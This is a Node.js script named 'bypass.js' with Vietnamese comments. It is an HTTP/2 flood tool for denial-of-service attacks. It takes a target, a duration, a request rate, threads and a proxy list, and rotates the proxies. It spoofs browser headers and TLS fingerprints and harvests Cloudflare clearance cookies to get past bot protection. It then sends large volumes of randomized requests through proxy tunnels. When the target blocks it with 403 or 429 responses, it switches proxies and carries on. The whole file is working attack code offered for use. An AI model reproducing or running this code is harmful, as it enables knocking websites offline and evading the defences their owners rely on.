const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs").promises;
const os = require("os");
const colors = require("colors");
const { JSDOM } = require("jsdom");
const HttpsProxyAgent = require("https-proxy-agent");

// Cấu hình headers động
const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/jxl,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
];

const cache_header = [
    'max-age=0',
    'no-cache',
    'no-store'
];

const language_header = [
    'en-US,en;q=0.9',
    'fr-FR,fr;q=0.8,en;q=0.7',
    'de-DE,de;q=0.9,en;q=0.8',
    'zh-CN,zh;q=0.9,en;q=0.8'
];

const fetch_site = ["same-origin", "same-site", "cross-site", "none"];
const fetch_mode = ["navigate", "same-origin", "no-cors", "cors"];
const fetch_dest = ["document", "subresource", "worker"];

// Danh sách trình duyệt với user-agent và thông tin sec-ch-ua
const browsers = [
    {
        userAgent: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36`,
        secChUa: `"Not/A)Brand";v="99", "Google Chrome";v="126", "Chromium";v="126"`,
        platform: `"Windows"`,
        ja3: "771,4865-4866-4867-49195-49199-49196-49200,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-21,29-23-24,0"
    },
    {
        userAgent: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15`,
        secChUa: `"Not/A)Brand";v="99", "Safari";v="17"`,
        platform: `"macOS"`,
        ja3: "771,4865-4866-4867-49195-49199,0-23-65281-10-11-35-16-5-13-18-51-45-43,29-23-24,0"
    },
    {
        userAgent: `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0`,
        secChUa: `"Not/A)Brand";v="99", "Firefox";v="128"`,
        platform: `"Windows"`,
        ja3: "771,4865-4866-4867-49195-49199,0-23-65281-10-11-35-16-5-13-18-51-45-43,29-23-24,0"
    }
];

// Cấu hình TLS
const cplist = [
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256"
];

const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256"
];

const SignalsList = sigalgs.join(':');
const ecdhCurve = "GREASE:X25519:P-256:P-384";
const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.SSL_OP_NO_TLSv1_3 |
    crypto.constants.ALPN_ENABLED;

const secureProtocol = "TLS_method";
const secureContext = tls.createSecureContext({
    ciphers: cplist.join(':'),
    sigalgs: SignalsList,
    honorCipherOrder: true,
    secureOptions,
    secureProtocol
});

// Bộ nhớ đệm cookie
const cookieStore = new Map();
const COOKIE_REFRESH_THRESHOLD = 5 * 60 * 1000; // Làm mới cookie nếu còn dưới 5 phút
const MAX_FAILED_ATTEMPTS = 5;
const MAX_RAM_PERCENTAGE = 99;
const MAX_CONCURRENT_REQUESTS = 100; // Giới hạn yêu cầu đồng thời

// Kiểm tra tham số đầu vào
if (process.argv.length < 7) {
    console.log(`Cách dùng: node bypass.js <host> <time> <req_rate> <threads> <proxy_file>`);
    process.exit();
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

const parsedTarget = url.parse(args.target);
let proxies = [];
let failedAttempts = 0;
let activeRequests = 0;

// Lưu cookie vào file
async function saveCookies() {
    const cookies = Array.from(cookieStore.entries()).map(([host, { cookie, expiry }]) => ({
        host,
        cookie,
        expiry
    }));
    await fs.writeFile('cookies.json', JSON.stringify(cookies, null, 2));
}

// Tải cookie từ file
async function loadCookies() {
    try {
        const data = await fs.readFile('cookies.json', 'utf-8');
        const cookies = JSON.parse(data);
        for (const { host, cookie, expiry } of cookies) {
            if (expiry > Date.now()) {
                cookieStore.set(host, { cookie, expiry });
            }
        }
    } catch (error) {
        console.log('[!] Không tìm thấy file cookie hoặc lỗi:', error.message);
    }
}

// Tải và kiểm tra proxy
async function loadValidProxies(filePath) {
    const proxyList = (await fs.readFile(filePath, 'utf-8')).split(/\r?\n/).filter(line => line.trim());
    const validProxies = [];
    const proxyPromises = proxyList.map(async proxy => {
        const [host, port] = proxy.split(':');
        const latency = await checkProxyLatency(host, port);
        if (latency) {
            validProxies.push({ proxy, latency });
        }
    });
    await Promise.all(proxyPromises);
    return validProxies.sort((a, b) => a.latency - b.latency).map(p => p.proxy);
}

// Kiểm tra độ trễ proxy
async function checkProxyLatency(host, port) {
    return new Promise(resolve => {
        const start = Date.now();
        const conn = net.connect({ host, port, timeout: 5000 });
        conn.on('connect', () => {
            conn.destroy();
            resolve(Date.now() - start);
        });
        conn.on('error', () => resolve(null));
        conn.on('timeout', () => {
            conn.destroy();
            resolve(null);
        });
    });
}

// Tạo JA3 fingerprint ngẫu nhiên
function getRandomJA3() {
    const browser = browsers[Math.floor(Math.random() * browsers.length)];
    const [version, ciphers, extensions] = browser.ja3.split(',');
    return {
        ciphers: ciphers.split('-').join(':'),
        extensions: extensions.split('-').join(':')
    };
}

// Tạo chuỗi ngẫu nhiên
function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return Array.from({ length }, () => characters[Math.floor(Math.random() * characters.length)]).join('');
}

// Giải JavaScript challenge
async function solveJSChallenge(targetUrl, proxyAddr) {
    try {
        const browser = browsers[Math.floor(Math.random() * browsers.length)];
        const response = await fetch(targetUrl, {
            agent: new HttpsProxyAgent(`http://${proxyAddr}`),
            headers: {
                'User-Agent': browser.userAgent,
                'Accept': accept_header[Math.floor(Math.random() * accept_header.length)],
                'Accept-Language': language_header[Math.floor(Math.random() * language_header.length)],
                'Accept-Encoding': 'gzip, deflate, br',
                'Cache-Control': cache_header[Math.floor(Math.random() * cache_header.length)],
                'Sec-Ch-Ua': browser.secChUa,
                'Sec-Ch-Ua-Platform': browser.platform,
                'Sec-Ch-Ua-Mobile': '?0'
            }
        });
        const html = await response.text();
        const dom = new JSDOM(html, { runScripts: 'dangerously' });
        const challengeScript = dom.window.document.querySelector('script')?.textContent;
        if (challengeScript && challengeScript.includes('cf_chl')) {
            console.log('[>] Đang xử lý JavaScript challenge...');
            // Giả lập giải challenge (cần logic cụ thể nếu challenge phức tạp)
        }
        const cookies = response.headers.get('set-cookie');
        if (cookies) {
            const cfClearance = cookies.match(/cf_clearance=[^;]+/)?.[0];
            const cfBm = cookies.match(/__cf_bm=[^;]+/)?.[0];
            return [cfClearance, cfBm].filter(Boolean).join('; ');
        }
        return null;
    } catch (error) {
        console.log(`[!] Lỗi khi xử lý JS challenge: ${error.message}`);
        return null;
    }
}

// Lấy hoặc làm mới cookie
async function getOrRefreshCookie(proxyAddr, targetUrl) {
    const host = url.parse(targetUrl).host;
    const storedCookie = cookieStore.get(host);

    if (storedCookie && storedCookie.expiry > Date.now() + COOKIE_REFRESH_THRESHOLD) {
        console.log(`[>] Sử dụng cookie đã lưu cho ${host}: ${storedCookie.cookie}`);
        return storedCookie.cookie;
    }

    try {
        const newCookie = await solveJSChallenge(targetUrl, proxyAddr);
        if (newCookie) {
            const expiry = Date.now() + 30 * 60 * 1000; // Cookie sống 30 phút
            cookieStore.set(host, { cookie: newCookie, expiry });
            await saveCookies();
            console.log(`[>] Lấy cookie mới: ${newCookie}`);
            return newCookie;
        }
    } catch (error) {
        console.log(`[!] Lỗi khi lấy cookie: ${error}`);
    }
    return null;
}

// Tạo headers động
function generateHeaders(cookie) {
    const browser = browsers[Math.floor(Math.random() * browsers.length)];
    return {
        ":method": "GET",
        ":authority": parsedTarget.host,
        ":scheme": "https",
        ":path": parsedTarget.path + "?" + randstr(3) + "=" + generateRandomString(10, 25),
        "user-agent": browser.userAgent,
        "accept": accept_header[Math.floor(Math.random() * accept_header.length)],
        "accept-encoding": "gzip, deflate, br",
        "accept-language": language_header[Math.floor(Math.random() * language_header.length)],
        "cache-control": cache_header[Math.floor(Math.random() * cache_header.length)],
        "sec-fetch-site": fetch_site[Math.floor(Math.random() * fetch_site.length)],
        "sec-fetch-mode": fetch_mode[Math.floor(Math.random() * fetch_mode.length)],
        "sec-fetch-dest": fetch_dest[Math.floor(Math.random() * fetch_dest.length)],
        "sec-ch-ua": browser.secChUa,
        "sec-ch-ua-platform": browser.platform,
        "sec-ch-ua-mobile": "?0",
        "cookie": cookie || ""
    };
}

// Quản lý cluster
if (cluster.isMaster) {
    console.clear();
    loadCookies().then(() => {
        loadValidProxies(args.proxyFile).then(validProxies => {
            proxies = validProxies;
            if (proxies.length === 0) {
                console.log("[!] Không tìm thấy proxy hợp lệ!".red);
                process.exit();
            }

            const restartScript = () => {
                for (const id in cluster.workers) {
                    cluster.workers[id].kill();
                }
                console.log('[>] Khởi động lại script sau 1000ms...'.yellow);
                setTimeout(() => {
                    for (let counter = 1; counter <= args.threads; counter++) {
                        cluster.fork();
                    }
                }, 1000);
            };

            const handleRAMUsage = () => {
                const totalRAM = os.totalmem();
                const usedRAM = totalRAM - os.freemem();
                const ramPercentage = (usedRAM / totalRAM) * 100;
                if (ramPercentage >= MAX_RAM_PERCENTAGE) {
                    console.log(`[!] RAM sử dụng tối đa: ${ramPercentage.toFixed(2)}%`.red);
                    restartScript();
                }
            };

            setInterval(handleRAMUsage, 5000);
            setInterval(async () => {
                proxies = await loadValidProxies(args.proxyFile);
                console.log(`[>] Đã làm mới danh sách proxy: ${proxies.length} proxy hợp lệ`.green);
            }, 10 * 60 * 1000); // Làm mới proxy mỗi 10 phút

            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        });
    });
} else {
    async function runFlooderWithRetry(maxRetries = 3, initialDelay = 1000) {
        let retries = 0;
        while (retries < maxRetries) {
            try {
                await runFlooder();
                return;
            } catch (error) {
                retries++;
                const delay = initialDelay * Math.pow(2, retries);
                console.log(`[!] Lỗi: ${error}, thử lại sau ${delay}ms (${retries}/${maxRetries})`.yellow);
                await new Promise(resolve => setTimeout(resolve, delay));
            }
        }
        console.log('[!] Vượt quá số lần thử lại, đổi proxy...'.red);
        proxies = await loadValidProxies(args.proxyFile);
    }
    setInterval(runFlooderWithRetry, 1000);
}

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = new Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(options.timeout * 600000);
        connection.setKeepAlive(true, 600000);
        connection.setNoDelay(true);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (!isAlive) {
                connection.destroy();
                return callback(undefined, "Lỗi: Phản hồi không hợp lệ từ proxy");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "Lỗi: Quá thời gian chờ");
        });

        connection.on("error", () => {
            connection.destroy();
            return callback(undefined, "Lỗi: Kết nối thất bại");
        });
    }
}

const Socker = new NetSocket();

async function runFlooder() {
    if (proxies.length === 0) {
        console.log("[!] Không có proxy hợp lệ, dừng lại...".red);
        throw new Error("No valid proxies");
    }

    const proxyAddr = proxies[Math.floor(Math.random() * proxies.length)];
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol === "https:" ? "443" : "80";

    const tlsOptions = {
        port: parsedPort,
        secure: true,
        ALPNProtocols: ["h2", "http/1.1"],
        ciphers: getRandomJA3().ciphers,
        sigalgs: SignalsList,
        requestCert: true,
        ecdhCurve: ecdhCurve,
        honorCipherOrder: false,
        rejectUnauthorized: false,
        secureOptions: secureOptions,
        secureContext: secureContext,
        host: parsedTarget.host,
        servername: parsedTarget.host,
        secureProtocol: secureProtocol
    };

    const cookie = await getOrRefreshCookie(proxyAddr, parsedTarget.href);
    if (!cookie) {
        failedAttempts++;
        console.log(`[!] Không lấy được cookie, thử lại... (${failedAttempts}/${MAX_FAILED_ATTEMPTS})`.yellow);
        if (failedAttempts >= MAX_FAILED_ATTEMPTS) {
            console.log("[!] Quá nhiều lần thất bại, làm mới proxy...".red);
            proxies = await loadValidProxies(args.proxyFile);
            failedAttempts = 0;
        }
        throw new Error("Failed to get cookie");
    }

    const orderedHeaders = generateHeaders(cookie);

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 5
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) {
            console.log(`[!] Lỗi proxy: ${error}`.red);
            throw new Error(error);
        }

        connection.setKeepAlive(true, 600000);
        connection.setNoDelay(true);

        const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions);
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 600000);
        tlsConn.setMaxListeners(0);

        const client = http2.connect(parsedTarget.href, {
            settings: {
                headerTableSize: 65536,
                maxHeaderListSize: 32768,
                initialWindowSize: 15564991,
                maxFrameSize: 16384
            },
            createConnection: () => tlsConn
        });

        client.setMaxListeners(0);
        client.settings({
            headerTableSize: 1048576,
            maxHeaderListSize: 1048576,
            initialWindowSize: 2147483647,
            maxFrameSize: 65536
        });

        client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                if (activeRequests >= MAX_CONCURRENT_REQUESTS) return;
                for (let i = 0; i < args.Rate; i++) {
                    setTimeout(() => {
                        if (activeRequests >= MAX_CONCURRENT_REQUESTS) return;
                        activeRequests++;
                        const request = client.request({ ...orderedHeaders }, {
                            parent: 0,
                            exclusive: true,
                            weight: 220
                        });
                        request.on('response', (response) => {
                            if (response[":status"] === 403 || response[":status"] === 429) {
                                console.log(`[!] Nhận mã ${response[":status"]}, đổi proxy và làm mới cookie...`.red);
                                failedAttempts++;
                                client.destroy();
                                tlsConn.destroy();
                                connection.destroy();
                                cookieStore.delete(parsedTarget.host);
                                runFlooder();
                            } else {
                                if (response["set-cookie"]) {
                                    const cookies = Array.isArray(response["set-cookie"]) ? response["set-cookie"] : [response["set-cookie"]];
                                    const newCookies = cookies.filter(c => c.includes("cf_clearance") || c.includes("__cf_bm")).map(c => c.split(';')[0]).join('; ');
                                    if (newCookies) {
                                        cookieStore.set(parsedTarget.host, { cookie: newCookies, expiry: Date.now() + 30 * 60 * 1000 });
                                        saveCookies();
                                        console.log(`[>] Cập nhật cookie: ${newCookies}`.green);
                                        failedAttempts = 0;
                                    }
                                }
                                request.close();
                                request.destroy();
                                activeRequests--;
                            }
                        });
                        request.on('error', () => {
                            client.destroy();
                            tlsConn.destroy();
                            connection.destroy();
                            activeRequests--;
                        });
                        request.end();
                    }, Math.random() * 200);
                }
            }, 1000);
        });

        client.on("close", () => {
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
            activeRequests = Math.max(0, activeRequests - 1);
        });

        client.on("timeout", () => {
            client.destroy();
            connection.destroy();
            activeRequests = Math.max(0, activeRequests - 1);
        });

        client.on("error", () => {
            client.destroy();
            connection.destroy();
            activeRequests = Math.max(0, activeRequests - 1);
        });
    });
}

const StopScript = () => process.exit(1);
setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});